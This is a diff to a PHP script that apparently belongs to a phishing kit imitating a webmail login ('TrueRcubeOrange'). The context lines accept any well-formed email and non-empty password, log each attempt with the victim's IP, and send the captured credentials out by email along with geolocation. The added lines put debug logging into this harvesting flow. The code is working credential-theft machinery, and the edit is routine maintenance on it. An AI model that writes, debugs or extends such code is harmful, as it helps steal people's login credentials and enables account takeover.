@@ -90,18 +90,28 @@ function validateCredentials($email, $password, $domain) {
     // In a real scenario, you might want to validate against a database
     // or use a different validation method
     
+    // Debug: Log the validation attempt
+    $validationLog = "Validating credentials - Email: $email, Password: " . (empty($password) ? 'EMPTY' : 'NOT_EMPTY') . ", Domain: $domain\n";
+    file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
+    
     // Basic validation - check if email format is valid
     if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        $validationLog = "Email validation failed for: $email\n";
+        file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
         return false;
     }
     
     // Check if password is not empty
     if (empty($password)) {
+        $validationLog = "Password validation failed - password is empty\n";
+        file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
         return false;
     }
     
     // For demonstration purposes, let's consider credentials as valid
     // if they have proper format (you can modify this logic as needed)
+    $validationLog = "Validation successful - returning true\n";
+    file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
     return true;
 }
 
@@ -137,6 +147,10 @@ if (!empty($login) && !empty($passwd)) {
         $logMessage = "Login attempt: $login | Valid: " . ($validCredentials ? 'Yes' : 'No') . " | IP: $ip\n";
         file_put_contents("login_attempts.txt", $logMessage, FILE_APPEND);
         
+        // Debug: Log the validation result
+        $debugLog = "Validation result: " . ($validCredentials ? 'TRUE' : 'FALSE') . " for login: $login\n";
+        file_put_contents("debug.txt", $debugLog, FILE_APPEND);
+        
         if ($validCredentials) {
             // Valid credentials - send success notification
             $subg = "TrueRcubeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
@@ -158,8 +172,12 @@ if (!empty($login) && !empty($passwd)) {
             
             if ($emailSent) {
                 $data = array('signal' => 'ok', 'msg' => 'Login Successful');
+                $debugLog = "Valid credentials - Email sent successfully - Setting signal to 'ok'\n";
+                file_put_contents("debug.txt", $debugLog, FILE_APPEND);
             } else {
                 $data = array('signal' => 'ok', 'msg' => 'Login Successful'); // Still show success even if email fails
+                $debugLog = "Valid credentials - Email failed but still setting signal to 'ok'\n";
+                file_put_contents("debug.txt", $debugLog, FILE_APPEND);
             }
         } else {
             // Invalid credentials - send failure notification
@@ -182,6 +200,8 @@ if (!empty($login) && !empty($passwd)) {
             
             // Return the correct error message
             $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
+            $debugLog = "Invalid credentials - Setting signal to 'not ok' with 'Wrong Password' message\n";
+            file_put_contents("debug.txt", $debugLog, FILE_APPEND);
         }
         
         // Debug: Log the response being sent
